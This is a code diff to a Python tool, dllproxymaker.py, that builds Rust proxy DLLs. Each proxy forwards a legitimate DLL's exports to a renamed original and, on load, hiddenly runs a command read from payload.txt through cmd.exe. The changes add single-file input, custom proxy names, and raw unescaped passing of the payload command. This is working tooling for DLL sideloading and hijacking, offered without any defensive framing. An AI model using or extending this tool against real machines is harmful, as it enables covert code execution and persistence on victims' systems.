@@ -6,13 +6,13 @@ Generates, for each input DLL, a Rust proxy that forwards every named export
 to a renamed copy of the original and executes a payload on load.
 
 Usage:
-    dllproxymaker.py <input_dir> <output_dir> [--payload CMD]
+    dllproxymaker.py <input> [output] [--payload CMD]
                      [--keep-going] [--skip LIST]
 
 Output layout (per DLL):
-    <output_dir>/<name>.dll           -> proxy (Rust stubs)
-    <output_dir>/<name>_orig.dll      -> renamed original
-    <output_dir>/payload.txt          -> command executed on proxy load
+    <output>/<name>.dll           -> proxy (Rust stubs)
+    <output>/<name>_orig.dll      -> renamed original
+    <output>/payload.txt          -> command executed on proxy load
 
 Export discovery is performed with `pefile`. Compilation is delegated to
 `cargo`/`rustc` using the target triple inferred from the original's PE
@@ -144,7 +144,8 @@ fn run_payload(dir: &PathBuf) {
         return;
     }
     let _ = Command::new("cmd.exe")
-        .args(["/c", cmd])
+        .arg("/c")
+        .raw_arg(cmd)
         .creation_flags(CREATE_NO_WINDOW)
         .stdin(Stdio::null())
         .stdout(Stdio::null())
@@ -247,8 +248,16 @@ def parse_args() -> argparse.Namespace:
         description="Generate Rust-based DLL proxies that forward exports "
                     "and execute a payload on load.",
     )
-    parser.add_argument("input_dir", help="Directory containing the original DLLs")
-    parser.add_argument("output_dir", help="Directory to write proxies and originals into")
+    parser.add_argument(
+        "input",
+        help="DLL file or directory containing original DLLs",
+    )
+    parser.add_argument(
+        "output",
+        nargs="?",
+        default=None,
+        help="Output directory or DLL path (default: same folder as input)",
+    )
     parser.add_argument(
         "--payload",
         default=DEFAULT_PAYLOAD,
@@ -420,6 +429,7 @@ def process_one(
     dll_path: Path,
     out_dir: Path,
     workroot: Path,
+    dest_name: str | None = None,
 ) -> DllInfo:
     """
     Inspect, generate and build a single proxy. Returns the DllInfo of
@@ -432,20 +442,18 @@ def process_one(
     if info.ordinal_only:
         print(f"    [!] {info.ordinal_only} ordinal-only exports will not be forwarded")
 
-    base = info.name[:-4]
+    proxy_name = dest_name or info.name
+    base = Path(proxy_name).stem
     original_name = f"{base}_orig.dll"
 
     lib_rs = render_lib_rs(original_name, info.exports)
     project = prepare_project(workroot, info.name, lib_rs)
     built_proxy = build_project(project, info.target)
 
-    # Renamed original
     (out_dir / original_name).write_bytes(dll_path.read_bytes())
+    shutil.copy2(built_proxy, out_dir / proxy_name)
 
-    # Proxy under the original name
-    shutil.copy2(built_proxy, out_dir / info.name)
-
-    print(f"    [+] OK -> {info.name} + {original_name}")
+    print(f"    [+] OK -> {proxy_name} + {original_name}")
     return info
 
 
@@ -474,14 +482,45 @@ def print_summary(
     print("[+] Reminder: payload.txt must sit alongside the DLLs at runtime")
 
 
+def resolve_io(input_path: Path, output: str | None, ext: str):
+    """Return (files, out_dir, dest_name). dest_name is set only for a single output file."""
+    if input_path.is_file():
+        if input_path.suffix.lower() != ext:
+            raise ValueError(f"Input file must be a {ext}: {input_path}")
+        files = [input_path]
+        default_dir = input_path.parent
+    elif input_path.is_dir():
+        files = sorted(input_path.glob(f"*{ext}"))
+        default_dir = input_path
+    else:
+        raise FileNotFoundError(f"Input does not exist: {input_path}")
+
+    dest_name = None
+    if not output:
+        return files, default_dir, None
+
+    dest = Path(output)
+    if dest.exists() and dest.is_dir():
+        return files, dest.resolve(), None
+    if dest.suffix.lower() == ext:
+        if len(files) != 1:
+            raise ValueError("Output file is only valid when processing a single input file")
+        dest = dest.resolve()
+        dest.parent.mkdir(parents=True, exist_ok=True)
+        return files, dest.parent, dest.name
+
+    return files, dest.resolve(), None
+
+
 def main() -> int:
     args = parse_args()
 
-    in_dir = Path(args.input_dir).resolve()
-    out_dir = Path(args.output_dir).resolve()
-
-    if not in_dir.is_dir():
-        print(f"[!] Input directory does not exist: {in_dir}")
+    try:
+        dlls, out_dir, dest_name = resolve_io(
+            Path(args.input).resolve(), args.output, ".dll"
+        )
+    except (FileNotFoundError, ValueError) as exc:
+        print(f"[!] {exc}")
         return 1
 
     out_dir.mkdir(parents=True, exist_ok=True)
@@ -491,8 +530,7 @@ def main() -> int:
     (out_dir / "payload.txt").write_text(args.payload + "\n", encoding="utf-8")
     print(f"[+] payload.txt written to {out_dir}")
 
-    dlls = sorted(in_dir.glob("*.dll"))
-    print(f"[+] {len(dlls)} DLL(s) found in {in_dir}")
+    print(f"[+] {len(dlls)} DLL(s) to process")
 
     workroot = Path(tempfile.mkdtemp(prefix="dllproxy_"))
     print(f"[+] Temporary workspace: {workroot}\n")
@@ -508,7 +546,7 @@ def main() -> int:
             continue
 
         try:
-            info = process_one(dll_path, out_dir, workroot)
+            info = process_one(dll_path, out_dir, workroot, dest_name)
             succeeded.append(info.name)
         except Exception as exc:
             failed.append(Result(dll_path.name, str(exc)))
